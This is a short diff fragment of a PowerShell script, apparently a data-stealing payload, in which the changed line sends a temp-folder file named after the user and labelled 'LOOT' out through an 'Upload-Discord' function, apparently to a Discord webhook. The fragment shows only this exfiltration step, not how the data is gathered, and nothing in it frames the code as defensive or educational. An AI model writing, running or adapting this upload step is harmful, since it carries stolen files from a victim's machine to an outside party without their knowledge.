@@ -109,4 +109,4 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$FileName"}
 
 #----------------------------------------------------------------------------------------------------------------------------------
 #File Sent
-Upload-Discord -text "File Upload" -file $FileName
+Upload-Discord -text "File Upload" -file $env:tmp/$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm).txt
